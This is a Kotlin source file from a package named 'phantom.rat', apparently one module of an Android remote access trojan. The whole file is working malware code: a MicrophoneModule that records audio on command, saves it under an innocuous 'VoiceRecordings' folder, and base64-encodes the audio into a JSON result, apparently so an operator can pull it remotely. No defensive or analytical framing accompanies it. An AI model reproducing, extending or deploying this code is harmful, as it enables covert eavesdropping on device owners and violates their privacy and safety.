package com.phantom.rat.modules

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.util.Base64
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.text.SimpleDateFormat
import java.util.*

class MicrophoneModule(private val context: Context) {

    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentFile: File? = null
    private var startTime: Long = 0
    private var maxDuration: Int = 30 // seconds default
    private var recordingCallback: ((Boolean, String) -> Unit)? = null

    fun startRecording(durationSeconds: Int = 30): JSONObject {
        val result = JSONObject()
        
        try {
            if (isRecording) {
                result.put("status", "error")
                result.put("message", "Already recording")
                return result
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED) {
                    result.put("status", "error")
                    result.put("message", "Record audio permission not granted")
                    return result
                }
            }
            
            // Create recordings directory
            val recordingsDir = File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
                "VoiceRecordings"
            )
            if (!recordingsDir.exists()) recordingsDir.mkdirs()
            
            // Generate filename with timestamp
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val fileName = "audio_${timestamp}.mp3"
            currentFile = File(recordingsDir, fileName)
            
            maxDuration = durationSeconds
            startTime = System.currentTimeMillis()
            
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioBitRate(128000)
                setAudioChannels(2)
                setOutputFile(currentFile?.absolutePath)
                
                if (maxDuration > 0) {
                    setMaxDuration(maxDuration * 1000)
                }
                
                setOnInfoListener { _, what, _ ->
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        stopRecording()
                    }
                }
                
                try {
                    prepare()
                    start()
                    isRecording = true
                    
                    result.put("status", "success")
                    result.put("message", "Recording started for $durationSeconds seconds")
                    result.put("file", currentFile?.absolutePath)
                    result.put("duration", durationSeconds)
                    result.put("start_time", startTime)
                    
                    // Auto-stop after duration
                    if (durationSeconds > 0) {
                        Thread {
                            Thread.sleep(durationSeconds * 1000L)
                            if (isRecording) {
                                stopRecording()
                            }
                        }.start()
                    }
                    
                } catch (e: Exception) {
                    release()
                    result.put("status", "error")
                    result.put("message", "Failed to start: ${e.message}")
                }
            }
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Unknown error")
        }
        
        return result
    }

    fun stopRecording(): JSONObject {
        val result = JSONObject()
        
        try {
            if (isRecording && mediaRecorder != null) {
                try {
                    mediaRecorder?.apply {
                        stop()
                        release()
                    }
                } catch (e: Exception) {
                    // Ignore stop errors
                }
                
                mediaRecorder = null
                isRecording = false
                
                val duration = System.currentTimeMillis() - startTime
                val fileSize = currentFile?.length() ?: 0
                
                // Read file as base64
                var audioB64 = ""
                try {
                    currentFile?.let { file ->
                        if (file.exists()) {
                            val fis = FileInputStream(file)
                            val bytes = fis.readBytes()
                            fis.close()
                            audioB64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        }
                    }
                } catch (_: Exception) {}
                
                result.put("status", "success")
                result.put("message", "Recording stopped")
                result.put("file", currentFile?.absolutePath ?: "")
                result.put("duration_ms", duration)
                result.put("duration_sec", duration / 1000)
                result.put("size", fileSize)
                result.put("audio_b64", audioB64)
                
            } else {
                result.put("status", "error")
                result.put("message", "No active recording")
            }
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Unknown error")
        }
        
        return result
    }

    fun getRecordingStatus(): JSONObject {
        val result = JSONObject()
        
        result.put("is_recording", isRecording)
        result.put("file", currentFile?.absolutePath ?: "")
        if (isRecording) {
            result.put("elapsed_sec", (System.currentTimeMillis() - startTime) / 1000)
            result.put("max_duration", maxDuration)
            result.put("remaining_sec", maxDuration - (System.currentTimeMillis() - startTime) / 1000)
        }
        
        return result
    }

    private fun release() {
        try {
            mediaRecorder?.apply {
                if (isRecording) {
                    try { stop() } catch (_: Exception) {}
                }
                release()
            }
        } catch (_: Exception) {}
        mediaRecorder = null
        isRecording = false
    }
}
